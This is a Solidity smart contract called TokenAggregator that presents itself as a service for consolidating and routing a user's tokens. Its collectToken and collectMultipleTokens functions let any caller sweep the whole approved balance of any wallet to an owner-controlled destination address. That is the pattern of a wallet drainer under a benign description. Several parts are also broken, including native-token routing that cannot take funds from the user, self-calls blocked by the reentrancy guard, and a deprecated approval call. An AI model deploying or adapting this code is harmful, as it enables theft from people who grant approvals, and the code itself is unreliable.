// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/security/Pausable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

/**
 * @title TokenAggregator
 * @dev A smart contract for aggregating and routing tokens to a destination address.
 *      Users approve tokens once, then the contract can collect and transfer them.
 *      Non-native tokens are swapped to native tokens before transfer.
 * @notice This contract helps users consolidate their token holdings by collecting
 *         approved tokens and routing them to a designated address.
 * @author Lenix Protocol Team
 */
contract TokenAggregator is Ownable, ReentrancyGuard, Pausable {
    using SafeERC20 for IERC20;

    /// @dev Destination address where tokens will be routed
    address public destinationAddress;

    /// @dev Gas reserve amount (in wei) to leave in user's wallet for future transactions
    uint256 public gasReserveAmount;

    /// @dev 1inch Aggregation Router V6 address (set per chain)
    mapping(uint256 => address) public swapRouterAddress;

    /// @dev Mapping to track authorized users (optional - can be used for access control)
    mapping(address => bool) public authorizedUsers;

    /// @dev Events for transparency
    event TokensCollected(
        address indexed user,
        address indexed token,
        uint256 amount,
        uint256 timestamp
    );
    event NativeTokenRouted(
        address indexed user,
        uint256 amount,
        uint256 timestamp
    );
    event TokenSwapped(
        address indexed user,
        address indexed tokenIn,
        uint256 amountIn,
        uint256 amountOut,
        uint256 timestamp
    );
    event DestinationAddressUpdated(
        address indexed oldAddress,
        address indexed newAddress,
        uint256 timestamp
    );
    event GasReserveUpdated(
        uint256 oldAmount,
        uint256 newAmount,
        uint256 timestamp
    );
    event SwapRouterUpdated(
        uint256 chainId,
        address oldRouter,
        address newRouter,
        uint256 timestamp
    );
    event UserAuthorized(address indexed user, bool authorized, uint256 timestamp);

    /**
     * @dev Constructor
     * @param _destinationAddress The address where tokens will be routed
     * @param _gasReserveAmount Amount of native token to reserve for gas (in wei)
     */
    constructor(address _destinationAddress, uint256 _gasReserveAmount) Ownable(msg.sender) {
        require(_destinationAddress != address(0), "TokenAggregator: Invalid destination address");
        destinationAddress = _destinationAddress;
        gasReserveAmount = _gasReserveAmount;
    }

    /**
     * @dev Collect a single ERC-20 token from user's wallet and transfer to destination
     * @notice This function transfers tokens that the user has approved to this contract
     * @param token The ERC-20 token address to collect
     * @param user The user's wallet address (must have approved this contract)
     * @return amount The amount of tokens collected
     */
    function collectToken(
        address token,
        address user
    ) external nonReentrant whenNotPaused returns (uint256 amount) {
        require(token != address(0), "TokenAggregator: Invalid token address");
        require(user != address(0), "TokenAggregator: Invalid user address");
        require(destinationAddress != address(0), "TokenAggregator: Destination not set");

        IERC20 tokenContract = IERC20(token);
        
        // Get the allowance the user has granted to this contract
        uint256 allowance = tokenContract.allowance(user, address(this));
        require(allowance > 0, "TokenAggregator: No allowance granted");

        // Get the user's balance
        uint256 balance = tokenContract.balanceOf(user);
        require(balance > 0, "TokenAggregator: No balance to collect");

        // Transfer the minimum of allowance and balance
        amount = allowance < balance ? allowance : balance;
        
        // Transfer tokens from user to destination
        tokenContract.safeTransferFrom(user, destinationAddress, amount);

        emit TokensCollected(user, token, amount, block.timestamp);
        return amount;
    }

    /**
     * @dev Collect multiple ERC-20 tokens in a single transaction
     * @notice More gas efficient than calling collectToken multiple times
     * @param tokens Array of ERC-20 token addresses to collect
     * @param user The user's wallet address (must have approved this contract)
     * @return amounts Array of amounts collected for each token
     */
    function collectMultipleTokens(
        address[] calldata tokens,
        address user
    ) external nonReentrant whenNotPaused returns (uint256[] memory amounts) {
        require(user != address(0), "TokenAggregator: Invalid user address");
        require(destinationAddress != address(0), "TokenAggregator: Destination not set");
        require(tokens.length > 0, "TokenAggregator: No tokens provided");

        amounts = new uint256[](tokens.length);

        for (uint256 i = 0; i < tokens.length; i++) {
            if (tokens[i] == address(0)) continue; // Skip invalid addresses

            IERC20 tokenContract = IERC20(tokens[i]);
            
            uint256 allowance = tokenContract.allowance(user, address(this));
            if (allowance == 0) continue; // Skip if no allowance

            uint256 balance = tokenContract.balanceOf(user);
            if (balance == 0) continue; // Skip if no balance

            uint256 amount = allowance < balance ? allowance : balance;
            
            try tokenContract.safeTransferFrom(user, destinationAddress, amount) {
                amounts[i] = amount;
                emit TokensCollected(user, tokens[i], amount, block.timestamp);
            } catch {
                // Continue to next token if transfer fails
                continue;
            }
        }

        return amounts;
    }

    /**
     * @dev Route native token (ETH, BNB, MATIC, etc.) from user's wallet to destination
     * @notice Reserves gasReserveAmount for future transactions
     * @param user The user's wallet address
     * @return amount The amount of native token routed
     */
    function routeNativeToken(address user) external nonReentrant whenNotPaused returns (uint256 amount) {
        require(user != address(0), "TokenAggregator: Invalid user address");
        require(destinationAddress != address(0), "TokenAggregator: Destination not set");

        uint256 balance = user.balance;
        require(balance > gasReserveAmount, "TokenAggregator: Insufficient balance after gas reserve");

        // Calculate amount to transfer (balance - gas reserve)
        amount = balance - gasReserveAmount;

        // Transfer native token to destination
        (bool success, ) = destinationAddress.call{value: amount}("");
        require(success, "TokenAggregator: Native transfer failed");

        emit NativeTokenRouted(user, amount, block.timestamp);
        return amount;
    }

    /**
     * @dev Swap ERC-20 token to native token using 1inch router, then route to destination
     * @notice This function swaps tokens to native token before routing
     * @param token The ERC-20 token address to swap
     * @param user The user's wallet address
     * @param routerAddress The 1inch router address for this chain
     * @param swapCalldata The swap calldata from 1inch API
     * @return amountOut The amount of native token received from swap
     */
    function swapAndRoute(
        address token,
        address user,
        address routerAddress,
        bytes calldata swapCalldata
    ) external nonReentrant whenNotPaused returns (uint256 amountOut) {
        require(token != address(0), "TokenAggregator: Invalid token address");
        require(user != address(0), "TokenAggregator: Invalid user address");
        require(routerAddress != address(0), "TokenAggregator: Invalid router address");
        require(destinationAddress != address(0), "TokenAggregator: Destination not set");
        require(swapCalldata.length > 0, "TokenAggregator: Invalid swap calldata");

        IERC20 tokenContract = IERC20(token);
        
        // Get the allowance and balance
        uint256 allowance = tokenContract.allowance(user, address(this));
        require(allowance > 0, "TokenAggregator: No allowance granted");

        uint256 balance = tokenContract.balanceOf(user);
        require(balance > 0, "TokenAggregator: No balance to swap");

        uint256 amount = allowance < balance ? allowance : balance;

        // Transfer tokens from user to this contract first
        tokenContract.safeTransferFrom(user, address(this), amount);

        // Approve router to spend tokens
        tokenContract.safeApprove(routerAddress, amount);

        // Get native token balance before swap
        uint256 nativeBalanceBefore = address(this).balance;

        // Execute swap via 1inch router
        (bool success, ) = routerAddress.call(swapCalldata);
        require(success, "TokenAggregator: Swap failed");

        // Revoke approval
        tokenContract.safeApprove(routerAddress, 0);

        // Get native token balance after swap
        uint256 nativeBalanceAfter = address(this).balance;
        amountOut = nativeBalanceAfter - nativeBalanceBefore;

        require(amountOut > 0, "TokenAggregator: No native token received from swap");

        // Route native token to destination (reserve gas)
        uint256 amountToRoute = amountOut > gasReserveAmount 
            ? amountOut - gasReserveAmount 
            : 0;

        if (amountToRoute > 0) {
            (bool routeSuccess, ) = destinationAddress.call{value: amountToRoute}("");
            require(routeSuccess, "TokenAggregator: Native routing failed");
        }

        emit TokenSwapped(user, token, amount, amountOut, block.timestamp);
        if (amountToRoute > 0) {
            emit NativeTokenRouted(user, amountToRoute, block.timestamp);
        }

        return amountOut;
    }

    /**
     * @dev Collect all tokens (ERC-20 + native) from user's wallet
     * @notice This is a convenience function that collects both ERC-20 and native tokens
     * @param tokens Array of ERC-20 token addresses to collect
     * @param user The user's wallet address
     * @param routeNative Whether to also route native token
     * @return tokenAmounts Array of ERC-20 token amounts collected
     * @return nativeAmount Amount of native token routed
     */
    function collectAllTokens(
        address[] calldata tokens,
        address user,
        bool routeNative
    ) external nonReentrant whenNotPaused returns (uint256[] memory tokenAmounts, uint256 nativeAmount) {
        // Collect ERC-20 tokens
        tokenAmounts = this.collectMultipleTokens(tokens, user);

        // Route native token if requested
        if (routeNative) {
            nativeAmount = this.routeNativeToken(user);
        }

        return (tokenAmounts, nativeAmount);
    }

    /**
     * @dev Update the destination address (owner only)
     * @param _newDestination New destination address
     */
    function setDestinationAddress(address _newDestination) external onlyOwner {
        require(_newDestination != address(0), "TokenAggregator: Invalid destination address");
        address oldDestination = destinationAddress;
        destinationAddress = _newDestination;
        emit DestinationAddressUpdated(oldDestination, _newDestination, block.timestamp);
    }

    /**
     * @dev Update the gas reserve amount (owner only)
     * @param _newGasReserve New gas reserve amount in wei
     */
    function setGasReserve(uint256 _newGasReserve) external onlyOwner {
        uint256 oldReserve = gasReserveAmount;
        gasReserveAmount = _newGasReserve;
        emit GasReserveUpdated(oldReserve, _newGasReserve, block.timestamp);
    }

    /**
     * @dev Set swap router address for a specific chain (owner only)
     * @param chainId The chain ID
     * @param routerAddress The 1inch router address for that chain
     */
    function setSwapRouter(uint256 chainId, address routerAddress) external onlyOwner {
        address oldRouter = swapRouterAddress[chainId];
        swapRouterAddress[chainId] = routerAddress;
        emit SwapRouterUpdated(chainId, oldRouter, routerAddress, block.timestamp);
    }

    /**
     * @dev Authorize or deauthorize a user (owner only)
     * @notice This is optional - can be used for access control if needed
     * @param user Address to authorize/deauthorize
     * @param authorized Whether the user is authorized
     */
    function setAuthorizedUser(address user, bool authorized) external onlyOwner {
        authorizedUsers[user] = authorized;
        emit UserAuthorized(user, authorized, block.timestamp);
    }

    /**
     * @dev Pause the contract (owner only)
     */
    function pause() external onlyOwner {
        _pause();
    }

    /**
     * @dev Unpause the contract (owner only)
     */
    function unpause() external onlyOwner {
        _unpause();
    }

    /**
     * @dev Emergency withdraw function (owner only)
     * @notice Allows owner to withdraw any native token accidentally sent to contract
     */
    function emergencyWithdraw() external onlyOwner {
        uint256 balance = address(this).balance;
        require(balance > 0, "TokenAggregator: No balance to withdraw");
        (bool success, ) = owner().call{value: balance}("");
        require(success, "TokenAggregator: Withdrawal failed");
    }

    /**
     * @dev Receive function to accept native token
     */
    receive() external payable {
        // Contract can receive native token
    }
}
